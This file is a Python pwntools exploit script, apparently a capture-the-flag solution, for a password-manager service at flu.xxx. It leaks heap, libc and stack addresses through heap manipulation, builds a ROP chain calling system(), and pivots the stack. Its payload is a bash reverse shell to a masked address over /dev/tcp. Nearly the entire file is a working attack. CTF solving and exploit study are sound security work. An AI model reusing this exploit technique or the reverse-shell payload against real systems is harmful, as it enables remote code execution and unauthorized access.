#!/usr/bin/env python2
#-*- coding: future_fstrings -*-
from pwn import *
# context.log_level = "debug"
def login(name):
    p.sendlineafter("> ", "1")
    p.sendlineafter(":", name)
    
def signup(name):
    p.sendlineafter("> ", "2")
    p.sendlineafter(":", name)
    
def logout():
    p.sendlineafter("> ", "4")
    
def report(content, title):
    p.sendlineafter("> ", "4")
    p.sendafter(":", content), sleep(0.1)
    p.sendafter(":", title), sleep(0.1)

def add_pw(password, slot_id):
    p.sendlineafter("> ", "1")
    p.sendlineafter(":", password)
    p.sendlineafter(":", str(slot_id))
    
def get_pw(slot_id):
    p.sendlineafter("> ", "2")
    p.sendlineafter(":", str(slot_id))
    
def del_pw(slot_id):
    p.sendlineafter("> ", "3")
    p.sendlineafter(":", str(slot_id))

if "remote" in os.environ:
    # p = remote("172.17.0.3", 1234)
    p = remote("flu.xxx", 10100)
else:
    p = process("./main")

signup("user")
login("user")
for i in range(10):
    add_pw("q" * (0xa0-7), i)
add_pw("w" * (0xa0-7), 11)

for i in range(10, -1, -1):
    del_pw(i)

get_pw(34)
p.recvuntil(": ")
heap_base = u64(p.recvline().rstrip().ljust(8, "\x00")) - 0xd20
print "heap_base", hex(heap_base)

add_pw("Q" * (0xa0-8) + p64(heap_base+0x7b0), 0)
get_pw(98)
p.recvuntil(": ")
libc_base = u64(p.recvline().rstrip().ljust(8, "\x00")) - 0x219ce0
print "libc_base", hex(libc_base)

environ = libc_base + 0x221200

logout()

report(''.join([
    "A" * 0x20, 
    p64(8), p64(environ), # use report (environ starts with null byte)
    "B" * 0x20
]).ljust(0x0f0, "!"), "Y" * 32)

login("user")
get_pw(36)
p.recvuntil(": ")
stack = u64(p.recvline().rstrip().ljust(8, "\x00"))
print "stack", hex(stack)
logout()

if "remote" in os.environ:
    leave_ret = libc_base + 0x5629c
    ret = leave_ret + 1
    system = libc_base + 0x000000000050d70
    libc_sleep = libc_base + 0x0000000000ea570
    rdi_r = libc_base + 0x2a3e5
    
else:
    leave_ret = libc_base + 0x4da83
    ret = leave_ret + 1
    system = libc_base + 0x50d70
    rdi_r = libc_base + 0x2d8f2

report(''.join([
    p64(ret) * 0x80,
    # p64(rdi_r), p64(100),
    # p64(libc_sleep),
    p64(rdi_r), p64(heap_base + 0x1148),
    p64(system),
    # offset: 0x1148
    "bash -c '/bin/bash -i >& /dev/tcp/???.???.???.???/????? 0>&1'",
    "\x00",
]).ljust(0x500, "@"), "Y" * 30)

# pause()

report(''.join([
    "A" * 0x40,
    
    # fake packet
    "X", "w" * (35 + 6),           # header (6 for padding)
    p64(stack - 0x3E8), # data
    "\x02",  # SRV_PARSE_DATA
    p64(heap_base + 0xd80), # stack pivoting
    p64(leave_ret),
]).ljust(0x0A40, "@"), "Y" * 32)

p.interactive()
"""
gdb -p `pidof main | awk '{print $1}'`
"""
